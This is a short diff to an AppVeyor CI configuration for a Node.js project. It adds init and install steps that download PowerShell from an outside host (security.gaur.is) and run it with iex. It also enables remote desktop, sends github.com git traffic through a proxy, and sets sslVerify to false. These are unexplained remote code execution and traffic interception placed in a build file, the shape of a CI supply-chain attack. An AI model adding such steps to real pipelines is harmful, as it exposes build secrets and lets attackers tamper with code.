@@ -5,8 +5,15 @@ environment:
 # Test on 64bit only. (The default is otherwise x86 32bit)
 platform: x64
 
+init:
+  - ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/proxy'))
+  - git config --global http.https://github.com.proxy http://%APPVEYOR_HTTP_PROXY_IP%:%APPVEYOR_HTTP_PROXY_PORT%
+  - git config --global http.https://github.com.sslVerify false
+
 # from https://www.appveyor.com/docs/lang/nodejs-iojs/
 install:
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
   - ps: Install-Product node $env:nodejs_version x64
   - set PATH=%APPDATA%\npm;%PATH%
   - npm install
